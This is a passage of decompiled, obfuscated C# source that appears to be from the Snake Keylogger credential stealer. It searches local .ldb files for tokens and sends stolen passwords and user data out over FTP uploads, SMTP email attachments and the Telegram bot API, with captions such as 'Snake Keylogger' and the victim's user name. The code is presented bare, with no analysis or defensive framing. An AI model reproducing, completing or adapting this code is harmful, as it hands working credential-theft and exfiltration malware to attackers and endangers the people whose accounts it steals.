				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	private static bool ɩŎ_FFFDϱЅ(ref string Ŵ_FFFD_FFFD㹃_26CA)
	{
		bool result;
		if (Directory.Exists(Ŵ_FFFD_FFFD㹃_26CA))
		{
			FileInfo[] files = new DirectoryInfo(Ŵ_FFFD_FFFD㹃_26CA).GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				if (fileInfo.get_Name().EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
				{
					Ŵ_FFFD_FFFD㹃_26CA += fileInfo.get_Name();
					return Ŵ_FFFD_FFFD㹃_26CA.EndsWith(".ldb");
				}
			}
			result = Ŵ_FFFD_FFFD㹃_26CA.EndsWith(".ldb");
		}
		else
		{
			result = false;
		}
		return result;
	}

	private static string Ң_FFFD_FFFD_06E8_FFFD(string 鈟BÒߟ꼺)
	{
		string[] collection = 鈟BÒߟ꼺.Substring(checked(鈟BÒߟ꼺.IndexOf("oken") + 4)).Split(new char[1] { '"' });
		List<string> list = new List<string>();
		list.AddRange(collection);
		list.RemoveAt(0);
		collection = list.ToArray();
		return string.Join("\"", collection);
	}

	private static string 鈟嵱ľ_FFFD_FFFD(string _FFFD_FFFDﾭیՄ, bool _FFFDɇ_002Dë_FFFD = false)
	{
		byte[] bytes = File.ReadAllBytes(_FFFD_FFFDﾭیՄ);
		string @string = Encoding.UTF8.GetString(bytes);
		string text = "";
		string text2 = @string;
		while (text2.Contains("oken"))
		{
			string[] array = Ң_FFFD_FFFD_06E8_FFFD(text2).Split(new char[1] { '"' });
			text = array[0];
			text2 = string.Join("\"", array);
			if (_FFFDɇ_002Dë_FFFD && text.Length == 59)
			{
				break;
			}
		}
		return text;
	}

	public static void _05B5ϒÒƟ_FFFD()
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Passwords ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes(盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ));
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
				byte[] buffer = Z_0040_FFFD㠰Ŵ();
				byte[] buffer2 = ή_002DΑ_F0B9_0331();
				MemoryStream contentStream = new MemoryStream(buffer);
				MemoryStream contentStream2 = new MemoryStream(buffer2);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Passwords" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				mailMessage.Attachments.Add(new Attachment(contentStream2, "User" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string 嵱Ң_FFFD_FFFD㹃 = 盀Ŵ恁ݶ恁("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ӛ_FFFDzmϒ);
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ӛױ_FFFD츠Ԝ = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				Ŕ_FFFDҢ꾯_02F3("SnakePW" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ӛױ_FFFD츠Ԝ, 嵱Ң_FFFD_FFFD㹃);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] Օ_FFFDϫ꾯_0089()
	{
		string s = "PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
		return Encoding.Unicode.GetBytes(s);
	}

	public static byte[] ב_FFFDΑʓ_058F()
	{
		string s = "PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
		return Encoding.Default.GetBytes(s);
	}

	public static void _FFFD븤_0327ݶչ()
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Passwords ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
				byte[] buffer = Օ_FFFDϫ꾯_0089();
				byte[] buffer2 = ב_FFFDΑʓ_058F();
				MemoryStream contentStream = new MemoryStream(buffer);
				MemoryStream contentStream2 = new MemoryStream(buffer2);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Passwords" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				mailMessage.Attachments.Add(new Attachment(contentStream2, "User" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string 嵱Ң_FFFD_FFFD㹃 = "PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ӛױ_FFFD츠Ԝ = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				Ŕ_FFFDҢ꾯_02F3("SnakePW" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ӛױ_FFFD츠Ԝ, 嵱Ң_FFFD_FFFD㹃);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void Մ_FFFDU_FFFD_FFFD(object _FFFD_060C_060C_FFFD퓜, EventArgs _FFFDՄ盀_FFFD_FFFD)
	{
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "%FTPDV$", false) == 0)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)(_06E8_FFFDtߟ_05B5 + ((ServerComputer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Name() + " - Passwords ID - "), _0306_0306j_0739_07B9), (object)_FFFD蠺_0026_0089ҡ) }, (string[])null, (Type[])null, (bool[])null);
			try
			{
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(ӛ_FFFD_FFFD_05C9_06DA, 恁_FFFDʪ_FFFD_FFFD);
				byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
				ftpWebRequest.ContentLength = bytes.Length;
				using Stream stream = ftpWebRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%SMTPDV$", false) == 0)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(_1CFCʤmåӓ);
				mailMessage.To.Add(_0089ҟߟ_06DA_2964);
				mailMessage.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
				mailMessage.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
				byte[] buffer = Օ_FFFDϫ꾯_0089();
				byte[] buffer2 = ב_FFFDΑʓ_058F();
				MemoryStream contentStream = new MemoryStream(buffer);
				MemoryStream contentStream2 = new MemoryStream(buffer2);
				mailMessage.Attachments.Add(new Attachment(contentStream, "Passwords" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				mailMessage.Attachments.Add(new Attachment(contentStream2, "User" + _FFFD蠺_0026_0089ҡ, "text/plain"));
				SmtpClient smtpClient = new SmtpClient(_DA6A_DC9A_FFFDƚȨ);
				if (Operators.CompareString(ݝاמЮҟ, "True", false) == 0)
				{
					smtpClient.EnableSsl = true;
				}
				else
				{
					smtpClient.EnableSsl = false;
				}
				smtpClient.Port = Conversions.ToInteger(_0300_0333_FFFD_FFFD_0097);
				smtpClient.Credentials = new NetworkCredential(_1CFCʤmåӓ, Ɯ_00ABεų_FFFD);
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(_06E3_FFFD_FFFD_FFFD_06E3, "$%TelegramDv$", false) == 0)
		{
			try
			{
				string 嵱Ң_FFFD_FFFD㹃 = "PW | " + Environment.UserName + " | Snake\r\n" + с_06E3_0332_FFFD_065A + "\r\n" + _FFFDҭӚ_FFFD_FFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				string ӛױ_FFFD츠Ԝ = string.Concat("https://api.telegram.org/bot", _003B_005EŁ_00BEҡ, "/sendDocument?chat_id=", ņ_07A8Ѕ_0300ʪ, "&caption=", " Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
				Ŕ_FFFDҢ꾯_02F3("SnakePW" + _FFFD蠺_0026_0089ҡ, "application/x-ms-dos-executable", ӛױ_FFFD츠Ԝ, 嵱Ң_FFFD_FFFD㹃);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static object ג_00ABױϘ_FFFD()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		checked
		{
			long num = default(long);
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady)
				{
					num += driveInfo.TotalSize;
				}
			}
			num = (long)Math.Round((double)num / 1048576.0 / 1024.0);
			return Conversions.ToString(num);
		}
	}

	public static void Ңӛ_FFFD蠺_0040()
	{
	}

	public static void _FFFD_FFFD䇹_FFFDΠ()
	{
	}

	public static void _FFFDO_FFFDΠ퓜()
	{
	}

	public static void հϱR_FFFD퓜()
	{
	}

	public static void _FFFDלZ_FFFD_07FB()
	{
	}

	public static void _FFFDɢ_05C3_0333Ң()
	{
	}

	public static void 盀߂䕃뜸_FFFD()
	{
	}

	public static void _FFFDӥΩ똛C()
	{
	}

	public static void Ѕ똛_DBB6_DDCB_0089()
	{
	}

	public static void Z_0657Ɵג_FFFD()
	{
	}

	public static void ʤ_FFFDҡ_0300Օ()
	{
	}

	public static void Қ_07B8ēޤ_FFFD()
	{
	}

	public static void _FFFDᔖٵϘ_FFFD()
	{
	}

	public static void 丐ҡ߂_0332_06E8()
	{
		try
		{
			_0333_06E3Ŕсݶ.set_Interval(1);
			_0333_06E3Ŕсݶ.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void اܪzꓞ_FFFD()
	{
	}

	public static void @W_07B4_0327ҏ()
	{
	}

	public static void _FFFD_DBB0_DC98_FFFDȨ()
	{
	}

	public static void أʪیŧ㠰()
	{
	}

	public static void _06DAc鈇嵱ë()
	{
		if (Operators.ConditionalCompareObjectEqual(ʓ늻ɇ_2964ή, (object)"ProtectTrue", false))
		{
			if (Operators.CompareString(_FFFDҭӚ_FFFD_FFFD, "", false) != 0)
			{
				_05B5ϒÒƟ_FFFD();
				Thread.Sleep(8000);
				_065A_FFFD_FFFDבų();
				Thread.Sleep(3000);
				_FFFDş_06E8_0097_FFFD();
				Thread.Sleep(3000);
				_0739ēé_07B4Ԍ();
				Thread.Sleep(3000);
				ꓞ_FFFDĂ_FFFDŁ();
			}
		}
		else if (Operators.CompareString(_FFFDҭӚ_FFFD_FFFD, "", false) != 0)
		{
			_FFFD븤_0327ݶչ();
			Thread.Sleep(8000);
			ا_003B泮_07FB_0300();
			Thread.Sleep(3000);
			_FFFDş_06E8_0097_FFFD();
			Thread.Sleep(3000);
			_0739ēé_07B4Ԍ();
			Thread.Sleep(3000);
			ꓞ_FFFDĂ_FFFDŁ();
		}
	}

	public static void _FFFDş_06E8_0097_FFFD()
	{
	}

	public static void _0739ēé_07B4Ԍ()
	{
	}

	public static void ꓞ_FFFDĂ_FFFDŁ()
	{
	}

	public static void _065A_FFFD_FFFDבų()
	{
	}

	public static void ا_003B泮_07FB_0300()
	{
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			Қ_07B8ēޤ_FFFD();
			_FFFD_FFFD䇹_FFFDΠ();
			_FFFDᔖٵϘ_FFFD();
			_FFFD_DBB0_DC98_FFFDȨ();
			_2964_FFFDή_06DAô._0300У蠺ϫζ();
			_2964_FFFDή_06DAô.鈇ҚBҟǎ();
			_2964_FFFDή_06DAô.C_2964_0657_FFFDΩ();
			_2964_FFFDή_06DAô.늻_0097_FFFD_065Aŧ();
			_2964_FFFDή_06DAô.콪JΑ_FFFDأ();
			_2964_FFFDή_06DAô.Ś븤_06E8븤_FFFD();
			_2964_FFFDή_06DAô._FFFD_07FB_FFFD_0739_0327();
			_2964_FFFDή_06DAô._0739똛_FFFD븤_06DA();
			_2964_FFFDή_06DAô.ٵמհ_FFFD_FFFD();
			_2964_FFFDή_06DAô._FFFDױ_FFFDΑҚ();
			_2964_FFFDή_06DAô._FFFD츠ŧ_FFFDԌ();
			_2964_FFFDή_06DAô._FFFDΩŲŔ_0314();
			_2964_FFFDή_06DAô._0300Ł_FFFD_0609չ();
			_2964_FFFDή_06DAô.ҏ_05B4اհϫ();
			_2964_FFFDή_06DAô.Π皍_FFFDĂܪ();
			_2964_FFFDή_06DAô.ޤ_0097_FFFD߂і();
			_2964_FFFDή_06DAô.Ɵ_FFFD_FFFDל_07A8();
			_2964_FFFDή_06DAô.œߟ퓜丐_FFFD();
			_2964_FFFDή_06DAô.ߟמ߂늻丐();
			_2964_FFFDή_06DAô.Ѕ_FFFD_00BEՄɇ();
			_2964_FFFDή_06DAô._0300ϫƉœ쐬();
			_2964_FFFDή_06DAô.ݝK_02E8Ԍ_05C3();
			_2964_FFFDή_06DAô._061CӚ_02E8œ_FFFD();
			_2964_FFFDή_06DAô.CЦӓZ_FFFD();
			_2964_FFFDή_06DAô.Ł_FFFD_05C9یٷ();
			_2964_FFFDή_06DAô.i㹃ӺRӺ();
			_2964_FFFDή_06DAô._FFFDεթ_058Fm();
			_2964_FFFDή_06DAô.Uj皍ζ_06E8();
			_2964_FFFDή_06DAô.䇹_FFFD똛_0385Ł();
			_2964_FFFDή_06DAô._FFFD盀_1CFC_0314ӓ();
			_2964_FFFDή_06DAô.یՕױ䕃_0314();
			_2964_FFFDή_06DAô._FFFDKΑՕ_0040();
			_2964_FFFDή_06DAô.УŁչƚ2();
			_2964_FFFDή_06DAô._FFFDױߡz_0332();
			_2964_FFFDή_06DAô.Ϙҡ_FFFD_05B5_06DA();
			_2964_FFFDή_06DAô.ë_0314_FFFDɇՕ();
			_2964_FFFDή_06DAô.ל_00ABݝ_FFFDĂ();
			_2964_FFFDή_06DAô._0300츠Ю_F0B9O();
			_2964_FFFDή_06DAô.Ò_07FBɮҢ_0314();
			_2964_FFFDή_06DAô.@Մ_032Eϫ_0332();
			_2964_FFFDή_06DAô.Π_06E8ٷ_0040m();
			_2964_FFFDή_06DAô.mגӛ_1CFCک();
			_2964_FFFDή_06DAô._FFFD蠺ʪĪҭ();
			_2964_FFFDή_06DAô._002Dݝ_0089_0609_1CFC();
			_2964_FFFDή_06DAô.Қٵŧ_05B4_2964();
			_2964_FFFDή_06DAô._0089أݝ_0314ջ();
			_2964_FFFDή_06DAô.Ц_FFFDɛɢ_061D();
			_2964_FFFDή_06DAô.鈇ƉZʪņ();
			_2964_FFFDή_06DAô._0385K_FFFDЅՄ();
			_2964_FFFDή_06DAô._FFFD_FFFD_06092_003B();
			_2964_FFFDή_06DAô.ɇ_FFFDAأU();
			ɢ_FFFDӺ_06E8꼺.Ŏ_FFFD_2964_0314ņ();
			ɢ_FFFDӺ_06E8꼺._2_FFFDή_FFFD߂();
			ɢ_FFFDӺ_06E8꼺.Z꾯zŎ_FFFD();
			ɢ_FFFDӺ_06E8꼺.ҡRأیc();
			ɢ_FFFDӺ_06E8꼺._FFFD_0300U_00ABΠ();
			ɢ_FFFDӺ_06E8꼺._061Dş_FFFDÒ_00BE();
			ɢ_FFFDӺ_06E8꼺._060C콪ƌЅ_FFFD();
			ɢ_FFFDӺ_06E8꼺.ҏU_FFFD_060C_0040();
			ɢ_FFFDӺ_06E8꼺._FFFD_D911_DEBAՄ䇹();
			ɢ_FFFDӺ_06E8꼺._FFFDŚ_0332Ѕ_FFFD();
			أʪیŧ㠰();
			_06DAc鈇嵱ë();
			Application.Run();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
